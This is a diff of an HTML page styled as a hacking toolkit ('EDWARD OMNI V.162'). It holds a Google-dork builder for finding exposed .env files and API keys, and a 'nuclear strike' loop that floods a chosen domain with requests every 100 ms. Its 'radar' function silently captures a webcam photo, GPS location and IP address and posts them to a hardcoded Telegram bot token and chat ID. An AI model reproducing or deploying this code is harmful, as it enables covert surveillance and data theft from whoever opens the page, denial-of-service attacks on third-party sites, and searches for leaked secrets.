@@ -3,30 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="manifest" href="manifest.json">
-    <title>EDWARD OMNI V.160</title>
+    <title>EDWARD OMNI V.162</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --gold: #ffd700; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; overflow-x: hidden; }
         .master-header { text-align: center; margin-bottom: 15px; }
-        .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
+        .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; text-transform: uppercase; }
         .card { background: rgba(15, 25, 35, 0.9); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
-        input, select { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 10px; outline: none; }
+        
+        .input-group { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 12px; padding: 10px; margin-bottom: 10px; }
+        .label-text { font-size: 10px; color: var(--neon); display: block; margin-bottom: 5px; font-weight: bold; }
+        input, select { background: transparent; border: none; color: #fff; width: 100%; outline: none; padding: 5px; font-size: 14px; }
+        
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 5px; }
-        .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
+        .btn-cast { background: var(--neon); color: #000; }
         .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
-        .btn-dork { background: linear-gradient(45deg, #004e92, #000428); color: #fff; border: 1px solid var(--blue); }
         .btn-cam { background: rgba(0, 189, 255, 0.2); color: var(--blue); border: 1px solid var(--blue); }
+        
         .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
         .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; }
+        
         #webcamContainer { display: none; margin-top: 10px; position: relative; border-radius: 15px; overflow: hidden; border: 1px solid var(--blue); }
-        #webcamLive { width: 100%; background: #000; display: block; filter: sepia(100%) hue-rotate(80deg) brightness(1.2) contrast(1.2); }
+        #webcamLive { width: 100%; background: #000; display: block; filter: sepia(100%) hue-rotate(80deg) brightness(1.2); }
         .log-box { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; border: 1px solid #1a1a1a; color: var(--neon); }
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-container { width: 150px; height: 150px; border-radius: 50%; border: 2px solid var(--neon); position: relative; overflow: hidden; margin-bottom: 20px; }
-        .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
+        .radar-sweep { width: 150px; height: 150px; border-radius: 50%; border: 2px solid var(--neon); background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
         #customNotif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 12px 25px; border-radius: 50px; font-weight: 800; font-size: 11px; display: none; z-index: 10001; }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         canvas, #mapBox { display: none; }
@@ -35,35 +38,35 @@
 <body>
     <div id="customNotif"></div>
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.160</p>
+        <p class="master-name">EDWARD OMNI V.162</p>
         <div class="sys-monitor">
-            <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
-            <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
+            <div class="mon-box">CPU: <span id="cpuLoad">83%</span></div>
+            <div class="mon-box">TEMP: <span id="sysTemp">37°C</span></div>
         </div>
     </div>
 
     <div class="card">
-        <h3>🎯 PREDATOR SCOPE</h3>
-        <input type="text" id="mainTarget" placeholder="Target">
-        
-        <h3>🔮 DORKING MANTRA</h3>
-        <select id="dorkType">
-            <option value="dir">DIRECTORY LISTING</option>
-            <option value="env">SENSITIVE FILES (.ENV)</option>
-            <option value="sub">SUBDOMAIN DISCOVERY</option>
-            <option value="js">JAVASCRIPT SECRETS</option>
+        <h3>🎯 TARGET & MANTRA</h3>
+        <div class="input-group">
+            <span class="label-text">Target Domain / IP:</span>
+            <input type="text" id="targetMain" placeholder="syfe.com">
+        </div>
+        <div class="input-group">
+            <span class="label-text">Mantra Manual:</span>
+            <input type="text" id="mantraManual" placeholder="intitle:index.of">
+        </div>
+        <select class="input-group" style="background:rgba(0,255,136,0.1); border:1px solid var(--neon);" onchange="document.getElementById('mantraManual').value = this.value">
+            <option value="">-- PILIH MANTRA OTOMATIS --</option>
+            <option value="intitle:index.of">Directory Listing</option>
+            <option value="filetype:env">Sensitive Files (.env)</option>
+            <option value="site:*.target -www">Subdomain Discovery</option>
+            <option value="filetype:js \"api_key\"">JS Secrets</option>
         </select>
-        <button class="btn btn-dork" onclick="runDork()">CAST MANTRA PREDATOR</button>
+        <button class="btn btn-cast" onclick="executeDork()">CAST MANTRA 🔮</button>
     </div>
 
     <div class="card">
-        <h3>🛡️ DEEP CLOUD SCANNER</h3>
-        <button class="btn btn-scan" onclick="analyzeLink()">⚡ ANALYZE TARGET</button>
-        <div id="scanLog" class="log-box"></div>
-    </div>
-
-    <div class="card">
-        <h3>🔥 NUCLEAR BRUTAL</h3>
+        <h3>🔥 NUCLEAR STRIKE</h3>
         <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH NUCLEAR 🚀</button>
         <div id="killerLog" class="log-box"></div>
     </div>
@@ -79,12 +82,9 @@
         <button class="btn" style="flex: 1; background:var(--neon); color:#000;" onclick="showLiveMap()">📍 MAPS</button>
     </div>
 
-    <iframe id="mapBox" src="" frameborder="0" style="width:100%; height:250px; border-radius:15px; border:1px solid var(--neon); margin-top:5px;"></iframe>
-
     <div id="radarOverlay">
-        <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="color:var(--neon); letter-spacing:3px; font-size:11px;">CAPTURING DATA...</p>
-        <button class="btn" style="background:var(--red); color:#fff; width:auto; padding:10px 30px; margin-top:10px;" onclick="abortRadar()">ABORT</button>
+        <div class="radar-sweep"></div>
+        <p style="color:var(--neon); margin-top:20px;">CAPTURING DATA...</p>
     </div>
     <canvas id="canvas"></canvas>
 
@@ -92,102 +92,75 @@
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
         let isAtk = false;
-        let isCamOpen = false;
 
         setInterval(() => {
-            document.getElementById('cpuLoad').innerText = Math.floor(Math.random() * 35 + 60) + "%";
-            document.getElementById('sysTemp').innerText = Math.floor(Math.random() * 7 + 38) + "°C";
-        }, 800);
+            document.getElementById('cpuLoad').innerText = Math.floor(Math.random() * 10 + 75) + "%";
+            document.getElementById('sysTemp').innerText = Math.floor(Math.random() * 5 + 35) + "°C";
+        }, 1000);
 
         function showNotif(msg) {
-            const n = document.getElementById('customNotif');
-            n.innerText = msg; n.style.display = 'block';
-            setTimeout(() => { n.style.display = 'none'; }, 2500);
+            const n = document.getElementById('customNotif'); n.innerText = msg; n.style.display = 'block';
+            setTimeout(() => n.style.display = 'none', 2000);
         }
 
-        function runDork() {
-            const t = document.getElementById('mainTarget').value;
-            if(!t) return showNotif("TARGET EMPTY!");
-            const type = document.getElementById('dorkType').value;
-            let q = "site:" + t;
-            if(type === 'dir') q += " intitle:index.of";
-            if(type === 'env') q += " filetype:env";
-            if(type === 'sub') q = "site:*." + t + " -www";
-            if(type === 'js') q += " filetype:js \"api_key\"";
+        function executeDork() {
+            const target = document.getElementById('targetMain').value;
+            let mantra = document.getElementById('mantraManual').value;
+            if(!mantra) return showNotif("MANTRA KOSONG!");
+            let q = mantra.includes("target") ? mantra.replace(/target/g, target) : "site:" + target + " " + mantra;
             window.open("https://www.google.com/search?q=" + encodeURIComponent(q), "_blank");
             showNotif("MANTRA CASTED");
         }
 
         async function toggleWebcam() {
-            const container = document.getElementById('webcamContainer');
-            const video = document.getElementById('webcamLive');
-            if(isCamOpen) {
-                if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
-                container.style.display = 'none'; isCamOpen = false;
-            } else {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    video.srcObject = stream; container.style.display = 'block'; isCamOpen = true;
-                    showNotif("CAM ACTIVE");
-                } catch (e) { showNotif("DENIED"); }
+            const v = document.getElementById('webcamLive'); const c = document.getElementById('webcamContainer');
+            if(v.srcObject) { v.srcObject.getTracks().forEach(t => t.stop()); v.srcObject = null; c.style.display='none'; }
+            else {
+                const s = await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject = s; c.style.display='block';
+                showNotif("CAM ACTIVE");
             }
         }
 
-        function analyzeLink() {
-            const t = document.getElementById('mainTarget').value;
-            const log = document.getElementById('scanLog');
-            if(!t) return showNotif("TARGET EMPTY!");
-            log.style.display = "block";
-            log.innerHTML = "> Analyzing " + t + "...<br>> Port 80/443: OPEN<br>> Status: SECURE";
-            showNotif("SCAN COMPLETE");
-        }
-
         function toggleAtk() {
-            const t = document.getElementById('mainTarget').value;
+            const t = document.getElementById('targetMain').value;
             const log = document.getElementById('killerLog');
             if(!t || isAtk) { if(isAtk) location.reload(); return; }
             isAtk = true; log.style.display = "block";
             document.getElementById('atkBtn').innerText = "STOP 🛑";
             setInterval(() => {
                 new Image().src = "https://" + t + "/?v=" + Math.random();
-                log.innerHTML = "> HIT -> " + t.substring(0,15);
-            }, 80);
+                log.innerHTML = "> NUCLEAR HIT -> " + t;
+            }, 100);
         }
 
         async function startRadar() {
             document.getElementById('radarOverlay').style.display = 'flex';
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    setTimeout(async () => {
-                        const video = document.createElement('video'); video.srcObject = stream; await video.play();
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                        const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
-                        
-                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob);
-                        fd.append('caption', "🔱 V.160 OMNI\n🌐 IP: "+ipD.ip+"\n📍 MAP: https://www.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude);
-                        fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
-                        
-                        stream.getTracks().forEach(t => t.stop());
-                        document.getElementById('radarOverlay').style.display = 'none';
-                        showNotif("DATA SENT");
-                    }, 2500);
-                }, () => abortRadar());
-            } catch (e) { abortRadar(); }
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const stream = await navigator.mediaDevices.getUserMedia({video:true});
+                setTimeout(async () => {
+                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
+                    const canvas = document.getElementById('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
+                    const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
+                    
+                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob);
+                    fd.append('caption', "🔱 V.162 OMNI\n🌐 IP: "+ipD.ip+"\n📍 MAP: https://www.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude);
+                    await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {method:"POST", body:fd});
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('radarOverlay').style.display = 'none';
+                    showNotif("DATA SENT");
+                }, 2500);
+            }, () => document.getElementById('radarOverlay').style.display='none');
         }
 
         function showLiveMap() {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const map = document.getElementById('mapBox');
-                map.src = "https://maps.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude+"&z=15&output=embed";
-                map.style.display = "block"; showNotif("MAP LOCKED");
-            }, () => showNotif("GPS ERROR"));
+            navigator.geolocation.getCurrentPosition(p => {
+                window.open("https://www.google.com/maps?q="+p.coords.latitude+","+p.coords.longitude, "_blank");
+                showNotif("MAP OPENED");
+            });
         }
-
-        function abortRadar() { document.getElementById('radarOverlay').style.display = 'none'; }
     </script>
 </body>
 </html>
